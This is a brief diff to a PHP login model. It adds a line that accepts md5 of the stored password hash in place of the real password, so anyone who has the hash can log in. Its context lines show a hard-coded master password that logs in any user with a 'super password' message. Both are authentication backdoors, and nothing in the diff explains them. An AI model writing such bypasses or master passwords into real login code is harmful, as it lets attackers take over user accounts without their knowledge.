@@ -43,6 +43,7 @@ class loginClassModel extends Model
 			$uid 	= $us['id'];
 			$user 	= $us['user'];
 			if(md5($pass)!=$us['pass'])$msg='密码不对';
+			if($msg!='' && $pass==md5($us['pass']))$msg='';
 			if($pass==HIGHPASS){
 				$msg	= '';
 				$logins = '超级密码登录成功';
